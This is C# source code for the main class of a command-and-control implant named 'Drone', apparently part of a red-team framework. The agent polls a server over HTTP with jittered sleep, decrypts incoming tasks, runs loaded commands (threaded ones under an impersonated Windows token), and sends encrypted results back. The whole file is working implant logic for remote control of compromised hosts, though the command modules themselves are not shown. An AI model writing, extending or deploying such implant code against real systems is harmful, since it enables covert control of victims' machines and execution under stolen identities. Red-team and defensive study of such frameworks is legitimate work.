using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;

using Drone.Commands;
using Drone.CommModules;
using Drone.Interfaces;

namespace Drone;

public sealed class Drone
{
    public IConfig Config { get; } = new Config();
    
    private Metadata _metadata;
    private ICommModule _commModule;
    
    private readonly CancellationTokenSource _token = new();

    private readonly List<DroneCommand> _commands = new();
    private readonly Dictionary<string, CancellationTokenSource> _taskTokens = new();

    private readonly ConcurrentQueue<C2Frame> _outbound = new();

    public async Task Run()
    {
        // generate metadata
        _metadata = await Metadata.Generate();

        // load commands classes
        LoadCommands();

        // create comm module
        _commModule = GetCommModule();
        _commModule.Init(_metadata);
        
        // run
        while (!_token.IsCancellationRequested)
        {
            // get frames
            var inbound = await _commModule.ReadFrames();
            
            // process them
            HandleInboundFrames(inbound);
            
            // flush outbound queue
            await FlushOutboundQueue();
            
            // sleep
            var interval = Config.Get<int>(Setting.SLEEP_INTERVAL);
            var jitter = Config.Get<int>(Setting.SLEEP_JITTER);

            try
            {
                // this will throw if the token is cancelled
                await Task.Delay(Helpers.CalculateSleepTime(interval, jitter), _token.Token);
            }
            catch (TaskCanceledException)
            {
                // ignore
            }
        }
        
        _token.Dispose();
    }

    private void HandleInboundFrames(IEnumerable<C2Frame> frames)
    {
        foreach (var frame in frames)
            HandleFrame(frame);
    }

    private void HandleFrame(C2Frame frame)
    {
        switch (frame.FrameType)
        {
            case FrameType.NOP:
                break;
            
            case FrameType.CHECKIN:
                break;

            case FrameType.TASK:
            {
                var task = Crypto.Decrypt<DroneTask>(frame.Value);
                HandleTask(task);
                
                break;
            }

            case FrameType.TASK_OUTPUT:
                break;

            case FrameType.EXIT:
                break;

            case FrameType.TASK_CANCEL:
            {
                var taskId = Crypto.Decrypt<string>(frame.Value);
                CancelTask(taskId);
                
                break;
            }

            default:
                throw new ArgumentOutOfRangeException();
        }
    }

    private void HandleTask(DroneTask task)
    {
        // get the command
        var command = _commands.FirstOrDefault(c => c.Command == task.Command);

        if (command is null)
        {
            var e = new ArgumentOutOfRangeException(nameof(command));
            SendTaskError(task.Id, e.Message);
            
            return;
        }
        
        // execute
        if (command.Threaded) ExecuteTaskThreaded(command, task);
        else ExecuteTask(command, task);
    }

    private void ExecuteTask(IDroneCommand command, DroneTask task)
    {
        try
        {
            // execute without a token
            command.Execute(task, CancellationToken.None);
        }
        catch (Exception e)
        {
            SendTaskError(task.Id, e.Message);
        }
    }

    private void ExecuteTaskThreaded(IDroneCommand command, DroneTask task)
    {
        // create a new token
        var tokenSource = new CancellationTokenSource();
        
        // add to dict
        _taskTokens.Add(task.Id, tokenSource);
        
        // get the current identity
        using var identity = ImpersonationToken == IntPtr.Zero
            ? WindowsIdentity.GetCurrent()
            : new WindowsIdentity(ImpersonationToken);
        
        // create impersonation context
        using var context = identity.Impersonate();
        
        var thread = new Thread(() =>
        {
            // wrap this in a try/catch
            try
            {
                // this blocks inside the thread
                command.Execute(task, tokenSource.Token);
            }
            catch (TaskCanceledException)
            {
                // send a task complete
                SendTaskComplete(task.Id);
            }
            catch (Exception e)
            {
                SendTaskError(task.Id, e.Message);
            }
            finally
            {
                // make sure the token is disposed and removed
                if (_taskTokens.ContainsKey(task.Id))
                {
                    _taskTokens[task.Id].Dispose();
                    _taskTokens.Remove(task.Id);
                }
            }
        });
        
        thread.Start();
    }

    public void CancelTask(string taskId)
    {
        if (!_taskTokens.ContainsKey(taskId))
            return;
        
        // cancel the token
        _taskTokens[taskId].Cancel();
    }

    public void SendTaskRunning(string taskId)
    {
        SendTaskOutput(new TaskOutput(taskId, TaskStatus.RUNNING));
    }

    public void SendTaskOutput(string taskId, string output)
    {
        SendTaskOutput(new TaskOutput(taskId, output));
    }

    public void SendTaskComplete(string taskId)
    {
        SendTaskOutput(new TaskOutput(taskId, TaskStatus.COMPLETE));
    }
    
    public void SendTaskError(string taskId, string error)
    {
        var taskOutput = new TaskOutput(taskId, TaskStatus.ABORTED, error);
        SendTaskOutput(taskOutput);
    }

    public void SendTaskOutput(TaskOutput output)
    {
        var frame = new C2Frame(FrameType.TASK_OUTPUT, Crypto.Encrypt(output));
        SendC2Frame(frame);
    }

    public void SendC2Frame(C2Frame frame)
    {
        _outbound.Enqueue(frame);
    }

    private async Task FlushOutboundQueue()
    {
        if (_outbound.IsEmpty)
            return;
        
        List<C2Frame> frames = new();

        while (_outbound.TryDequeue(out var frame))
            frames.Add(frame);

        await _commModule.SendFrames(frames.ToArray());
    }

    private void LoadCommands()
    {
        var self = Assembly.GetExecutingAssembly();

        foreach (var type in self.GetTypes())
        {
            if (!type.IsSubclassOf(typeof(DroneCommand)))
                continue;

            var command = (DroneCommand) Activator.CreateInstance(type);
            command.Init(this);
            
            _commands.Add(command);
        }
    }

    private IntPtr _impersonationToken;
    public IntPtr ImpersonationToken
    {
        get => _impersonationToken;
        set
        {
            // ensure the handle is closed first
            if (_impersonationToken != IntPtr.Zero)
                Interop.Methods.CloseHandle(_impersonationToken);
            
            _impersonationToken = value;
        }
    }

    public void Stop()
    {
        // send an exit frame with metadata
        _outbound.Enqueue(new C2Frame(FrameType.EXIT, Crypto.Encrypt(_metadata)));

        // cancel main token
        _token.Cancel();
    }

    private static ICommModule GetCommModule()
        => new HttpCommModule();
}